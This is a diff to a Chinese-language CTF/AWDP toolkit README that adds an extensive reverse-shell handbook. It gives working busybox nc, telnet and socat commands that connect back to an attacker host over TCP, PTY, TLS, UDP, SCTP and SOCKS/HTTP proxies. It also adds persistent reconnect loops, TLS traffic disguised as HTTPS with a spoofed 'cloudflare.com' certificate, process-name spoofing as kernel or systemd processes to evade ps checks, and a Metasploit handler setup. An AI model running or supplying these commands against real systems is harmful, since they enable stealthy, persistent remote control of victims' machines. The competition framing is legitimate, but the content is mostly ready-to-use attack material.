@@ -104,6 +104,34 @@ tar xzf payload.tar.gz
 ./busybox httpd -f -p 8080 -h /tmp/
 ```
 
+**场景 4: nc (netcat) 反弹 Shell**
+
+```bash
+# === 靶机执行（反弹到攻击机）===
+# 方式 A：-e 参数（部分 nc 版本支持）
+./busybox nc attacker_ip 9999 -e /bin/sh
+
+# 方式 B：管道方式（更通用，不依赖 -e）
+./busybox nc attacker_ip 9999 -e /bin/sh
+# 如果不支持 -e，用管道：
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f
+```
+
+**场景 5: telnet 反弹 Shell**
+
+```bash
+# 攻击机开启两个端口监听（一个收命令输出，一个发命令输入）
+# 攻击机终端1：接收输出
+./busybox nc -lvp 8888
+# 攻击机终端2：发送命令
+./busybox nc -lvp 9999
+
+# 靶机执行
+rm -f /tmp/f; mkfifo /tmp/f
+./busybox telnet attacker_ip 8888 < /tmp/f | /bin/sh 2>&1 | ./busybox telnet attacker_ip 9999 > /tmp/f
+```
+
 ---
 
 ### 2. inotifywait —— 文件系统事件监控
@@ -494,22 +522,35 @@ iptables -t nat -A OUTPUT -p tcp -d 0/0 -j REDIRECT --to-ports 12345
 
 #### CTF 场景示例
 
-**场景 1: SSL 加密反向 Shell —— 绕过 IDS/IPS**
+**场景 1: 基础反向 Shell (明文 TCP)**
+
+```bash
+# 攻击机监听
+./net/socat TCP-LISTEN:9999,reuseaddr STDOUT,raw,echo=0
+
+# 靶机反弹（无伪终端，基础版）
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh
+
+# 靶机反弹（带 PTY 伪终端，支持 Ctrl+C、vim 等全交互）
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+**场景 2: SSL/TLS 加密反向 Shell —— 绕过 IDS/IPS**
 
 ```bash
 # 攻击机生成自签名证书
-openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cdn.example.com"
 
 # 攻击机监听 (加密)
 ./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork \
     STDOUT,raw,echo=0
 
-# 靶机执行反弹 (加密)
-./net/socat OPENSSL:10.0.0.100:443,verify=0 \
+# 靶机执行反弹 (加密，流量在 IDS 中显示为 HTTPS，难以检测)
+./net/socat OPENSSL:attacker_ip:443,verify=0 \
     EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
-**场景 2: 端口复用穿透内网**
+**场景 3: 端口复用穿透内网**
 
 ```bash
 # 靶机 (跳板) 上将本地 3389 端口转发到内网 Windows 机器
@@ -520,7 +561,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
     SOCKS4:10.0.0.100:192.168.2.50:22,socksport=1080
 ```
 
-**场景 3: AWDP 绕过端口封锁**
+**场景 4: AWDP 绕过端口封锁**
 
 ```bash
 # 对手封了 80 端口？用 socat 做端口映射
@@ -528,7 +569,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 ./net/socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80 &
 ```
 
-**场景 4: 建立 TUN 隧道**
+**场景 5: 建立 TUN 隧道**
 
 ```bash
 # 在两台机器间建立虚拟网卡隧道
@@ -538,7 +579,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 ./net/socat TCP:server:7777 TUN:192.168.99.2/24,up
 ```
 
-**场景 5: 快速文件传输**
+**场景 6: 快速文件传输**
 
 ```bash
 # 发送端
@@ -548,14 +589,99 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -node
 ./net/socat -u TCP:send_ip:8888 CREATE:/tmp/payload.tar.gz
 ```
 
-**场景 6: PTY 反弹 Shell (完全交互式)**
+**场景 7: 多版本反向 Shell 详解**
+
+socat 是 CTF 中最强大的反弹 Shell 工具，以下是各场景详解：
+
+**① 基础反向 Shell（明文 TCP）**
 
 ```bash
-# 靶机
-./net/socat TCP:attacker:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+# 靶机执行
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh
+```
 
-# 攻击机 (需要额外工具如 rlwrap 获得最佳体验)
-rlwrap ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999
+**② 全交互 PTY 反向 Shell**
+
+> **关键参数说明**: `pty` 分配伪终端（支持 Ctrl+C、Ctrl+Z 等信号）、`stderr` 将 stderr 重定向到 socket、`setsid` 创建新会话脱离当前终端、`sigint` 传递 SIGINT 信号给子进程、`sane` 终端行规范模式。
+
+```bash
+# 靶机执行（等待连接）
+./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+# 或主动反弹
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# 攻击机监听（获得稳定交互终端）
+./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999
+```
+
+**③ SSL/TLS 加密反向 Shell**
+
+```bash
+# 攻击机: 生成证书并监听
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=cdn.example.com"
+./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT,raw,echo=0
+
+# 靶机反弹（加密流量，IDS 显示为 HTTPS）
+./net/socat OPENSSL:attacker_ip:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+**④ Fork 持久化反向 Shell（目标断开后自动重新连接）**
+
+```bash
+# 攻击机 fork 模式（可同时接多个连接）
+./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0
+
+# 靶机无限重连（断线自动恢复）
+while true; do
+    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+    sleep 5
+done &
+```
+
+**⑤ 通过 SOCKS 代理反弹（多层网络穿透）**
+
+```bash
+# 场景：攻击机 10.0.0.1，跳板机 10.0.0.5(SOCKS5:1080)，靶机在 172.16.0.100
+# 攻击机先建立 SOCKS 隧道到跳板机，然后靶机通过 SOCKS 反弹到攻击机
+
+# 靶机通过跳板机 SOCKS 反弹
+./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+**⑥ 通过 HTTP 代理反弹**
+
+```bash
+# 靶机通过 HTTP CONNECT 代理反弹
+./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+**⑦ UDP 反弹 Shell（绕过只拦截 TCP 的防火墙）**
+
+```bash
+# 攻击机 UDP 监听
+./net/socat UDP-LISTEN:9999 STDOUT
+
+# 靶机 UDP 反弹
+./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
+```
+
+**⑧ SCTP 反弹 Shell**
+
+```bash
+# 攻击机 SCTP 监听
+./net/socat SCTP-LISTEN:9999 STDOUT
+
+# 靶机 SCTP 反弹
+./net/socat SCTP:attacker_ip:9999 EXEC:/bin/sh
+```
+
+**⑨ 进程隐藏技巧**
+
+```bash
+# 修改进程名为系统进程，躲避 ps 排查
+exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
 ```
 
 ---
@@ -619,6 +745,239 @@ done
 
 # 使用 strings 快速提取可读内容
 ./busybox strings /tmp/http.pcap | grep -iE 'password|flag|secret|token'
+```
+
+---
+
+## 反弹 Shell 专题 —— 全方位对照手册
+
+> 本节汇总本仓库中**所有可用于反弹 Shell 的工具**，按场景分类，标注适用条件和关键说明。
+
+### 工具对比速查表
+
+| 工具 | 加密 | PTY 交互 | 断线重连 | 体积 | 适用场景 |
+|------|:----:|:-------:|:-------:|------|----------|
+| `busybox nc` | ❌ | ❌ | ❌ | 1.2M | 轻量、最通用、管道绕过无 -e |
+| `socat` (TCP) | ❌ | ✅ | ✅ | 6.5M | **首选**，全交互终端 |
+| `socat` (SSL) | ✅ | ✅ | ✅ | 6.5M | 加密通信、绕过 IDS |
+| `socat` (SOCKS) | ❌ | ✅ | ✅ | 6.5M | 多层内网穿透 |
+| `socat` (UDP) | ❌ | ❌ | ❌ | 6.5M | 绕过 TCP-only 防火墙 |
+| `busybox telnet` | ❌ | ❌ | ❌ | 1.2M | 无 nc 时的备选方案 |
+
+---
+
+### 1. busybox nc 反弹 Shell
+
+> **说明**: `-e` 参数并非所有 nc 版本都支持，管道 FIFO 方式最通用。缺点是无 PTY，不能运行 vim、su 等交互式程序。
+
+```bash
+# === 方式 A：-e 参数（简洁但可能不支持）===
+./busybox nc attacker_ip 9999 -e /bin/sh
+
+# === 方式 B：管道 FIFO（最通用，推荐）===
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f
+
+# === 方式 C：mkfifo + 重定向（可复用连接）===
+rm -f /tmp/f; mkfifo /tmp/f
+while true; do
+    cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc -lkp 9999 > /tmp/f
+done &
+# 攻击机: nc target_ip 9999
+```
+
+> **关键说明**: `-i` 参数使 shell 进入交互模式，`2>&1` 将标准错误也发送给攻击机，`mkfifo` 创建命名管道打通 stdin/stdout 双向数据流。
+
+---
+
+### 2. socat 反弹 Shell（全场景覆盖）
+
+#### 2.1 基础 TCP 反弹
+
+> **说明**: 最简单的方式，无加密无伪装，适合内网直连场景。
+
+```bash
+# 靶机
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh
+
+# 攻击机
+./net/socat TCP-LISTEN:9999 STDOUT
+```
+
+#### 2.2 PTY 全交互反弹
+
+> **关键参数详解**:
+> - `pty`: 分配伪终端，使目标进程认为自己运行在真实终端上（支持 Ctrl+C、Ctrl+Z、tab 补全）
+> - `stderr`: 将子进程的标准错误重定向到 socket，否则错误信息会丢失
+> - `setsid`: 创建新的会话 ID，使 shell 脱离当前终端控制（避免终端关闭时子进程 SIGHUP）
+> - `sigint`: 将攻击方按 Ctrl+C 产生的 SIGINT 传递给子进程（不是给 socat 自身）
+> - `sane`: 进入 PTY 时设置终端行规范模式，防止终端状态混乱
+
+```bash
+# 靶机
+./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# 攻击机（推荐方式）
+stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane
+# 说明: stty raw -echo 关闭本地回显，raw 模式使攻击机按原始字符传递
+```
+
+#### 2.3 SSL/TLS 加密反弹（推荐生产使用）
+
+> **说明**: 流量在 IDS/WAF 中显示为 HTTPS，配合 443 端口几乎无法被检测。证书可以是自签名的，因为 `verify=0` 不会验证。
+
+```bash
+# 攻击机: 生成自签名证书
+openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
+    -days 30 -nodes -subj "/CN=cloudflare.com"
+
+# 攻击机: 监听
+./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork \
+    STDOUT,raw,echo=0
+
+# 靶机: 反弹
+./net/socat OPENSSL:attacker_ip:443,verify=0 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+#### 2.4 Fork 模式——多客户端并发 + 断线重连
+
+> **说明**: `fork` 使攻击机可以同时接收多个连接（每个连接独立交互窗口）。靶机用 while 循环实现断线重连，避免因网络波动丢失控制权。
+
+```bash
+# 攻击机: fork 监听（接受多连接）
+./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0
+
+# 靶机: 无限重连（5秒间隔）
+while true; do
+    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+    sleep 5
+done &
+```
+
+#### 2.5 通过 SOCKS 代理反弹（多层网络穿透）
+
+> **说明**: 当靶机不能直连攻击机时，通过已有的 SOCKS 跳板完成反弹。适用于多层内网横向移动。
+
+```bash
+# 假设跳板机 10.0.0.5 已搭建 SOCKS5 代理（端口 1080）
+# 靶机通过跳板机的 SOCKS5 代理连接到攻击机
+./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+#### 2.6 通过 HTTP 代理反弹
+
+> **说明**: 当目标网络允许 HTTP/HTTPS 出站但拦截其他流量时，通过 HTTP CONNECT 方法建立隧道。
+
+```bash
+./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+#### 2.7 UDP 反弹（绕过 TCP 流量审计）
+
+> **说明**: 部分防火墙/WAF 只审计 TCP 流量，UDP 反弹可绕过。缺点是无连接、不保证送达、不支持 PTY。
+
+```bash
+# 攻击机
+./net/socat UDP-LISTEN:9999 STDOUT
+
+# 靶机
+./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
+```
+
+#### 2.8 反向连接变种：正向绑定（靶机监听，攻击机连入）
+
+> **说明**: 反弹（Reverse）是靶机出站连攻击机（穿透 NAT/防火墙）；正向绑定（Bind）是靶机开端口，攻击机主动连入。
+
+```bash
+# 靶机: 在本地 9999 端口开 shell，等待连入
+./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# 攻击机: 连入靶机
+./net/socat TCP:target_ip:9999 STDOUT,raw,echo=0
+```
+
+#### 2.9 进程隐藏技巧
+
+> **说明**: 在 AWDP 中，对手会通过 `ps aux` 排查恶意进程。使用 `exec -a` 可修改进程名，伪装为系统进程。
+
+```bash
+exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
+
+exec -a "[rcu_gp]" ./net/socat TCP:attacker:9999 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
+
+exec -a "systemd-journald" ./net/socat TCP:attacker:9999 \
+    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
+```
+
+---
+
+### 3. busybox telnet 反弹 Shell
+
+> **说明**: 当目标没有 nc 但有 telnet 时，使用双端口方案模拟反弹 shell（一个端口发命令，一个端口收输出）。
+
+```bash
+# 攻击机: 开两个终端
+# 终端1：接收命令输出
+./busybox nc -lvp 8888
+# 终端2：发送键盘输入
+./busybox nc -lvp 9999
+
+# 靶机执行
+rm -f /tmp/f; mkfifo /tmp/f
+./busybox telnet attacker_ip 8888 < /tmp/f | \
+    /bin/sh 2>&1 | \
+    ./busybox telnet attacker_ip 9999 > /tmp/f
+```
+
+---
+
+### 4. 实战选择指南
+
+```
+                    ┌─ 目标有 socat? ──── 是 ──→ 使用 socat SSL/PTY 反弹（最佳方案）
+                    │
+获得 Shell 后 ─── 要加密? ──── 是 ──→ socat OPENSSL（绕过 IDS）
+    │               │
+    │               └── 否 ──→ 要全交互? ──── 是 ──→ socat PTY
+    │                              │
+    │                              └── 否 ──→ busybox nc FIFO（最小体积）
+    │
+    └── 只有 busybox? ──── 是 ──→ busybox nc 管道方式（最通用）
+         │
+         └── 无 nc 有 telnet? ──→ busybox telnet 双端口方案
+```
+
+### 攻击机监听设置指南
+
+```bash
+# ===== 推荐：使用 socat 作为监听端（功能最全）=====
+# 基础监听
+./net/socat TCP-LISTEN:9999,reuseaddr STDOUT
+
+# Fork 模式（支持多连接，每个 kill 后重新监听）
+./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT
+
+# 配合 rlwrap 获得 readline 历史记录和行编辑
+rlwrap ./net/socat TCP-LISTEN:9999,reuseaddr STDOUT
+
+# 完整 PTY 监听（搭配靶机 PTY 反弹）
+stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane
+
+# SSL 加密监听
+./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork STDOUT
+
+# ===== 备选：使用 busybox nc 作为监听端 =====
+./busybox nc -lvp 9999
+
+# ===== 进阶：使用 socat 将监听转发到 Metasploit handler =====
+# socat 端口转发 → msf multi/handler
+./net/socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:4444 &
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
 ```
 
 ---
